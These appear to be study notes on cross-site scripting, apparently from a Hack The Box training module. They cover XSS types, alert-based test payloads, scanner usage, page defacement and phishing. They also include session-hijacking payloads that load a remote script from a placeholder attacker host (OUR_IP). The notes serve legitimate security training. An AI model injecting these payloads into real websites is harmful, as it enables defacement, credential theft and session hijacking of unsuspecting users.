- XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.
- Types of XSS
    - Stored (Persistent) - user input is stored in back-end
    - Reflected (non-persistent xss)  - processed in the backend
    - DOM-based XSS  - not processed
- Stored XSS
    - Test payload `<script>alert(window.origin)</script>`
    - XSS payload is <plaintext>  which will stop rendering the HTML code that comes after it and display it as plaintext
    - Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.
    - Another easy-to-spot payload is <script>print()</script> that will pop up the browser print dialog
- Reflected XSS
    - Unlike Persistent XSS, Non-Persistent XSS vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.
    - Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized.
- DOM XSS
    - DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).
    - The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
    - Some of the commonly used JavaScript functions to write to DOM objects are:
        - document.write()
        - DOM.innerHTML
        - DOM.outerHTML
    - Furthermore, some of the jQuery library functions that write to DOM objects are:
        - add()
        - after()
        - append()
    - If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the <script> tags within it as a security feature
    - `<img src="" onerror=alert(window.origin)>`
- XSS discovery
    - Automated Discovery
        - tools that can assist us in XSS discovery are XSS Strike, Brute XSS, and XSSer
        
        ```php
        [!bash!]$ git clone https://github.com/s0md3v/XSStrike.git
        [!bash!]$ cd XSStrike
        [!bash!]$ pip install -r requirements.txt
        [!bash!]$ python xsstrike.py
        ```
        
        - `python [xsstrike.py](http://xsstrike.py/) -u "http://SERVER_IP:PORT/index.php?task=test"`
    - Manual
        - on PayloadAllTheThings or the one in PayloadBox
        - Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
    - Code Review
- Defacing
    - bg = `<script>document.body.style.background = "#141d2b"</script>`
    - img = `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`
    - title = `<script>document.title = 'HackTheBox Academy'</script>`
    - Page text = `document.getElementById("todo").innerHTML = "New Text"`
        - Jquery `$("#todo").html('New Text');`
        - `document.getElementsByTagName('body')[0].innerHTML = "New Text"`
- Phishing
    - A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server
- Session Hijacking
    - Loading a remote script - `<script src="http://OUR_IP/script.js"></script>`
    - So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:
    - `<script src="http://OUR_IP/username"></script>`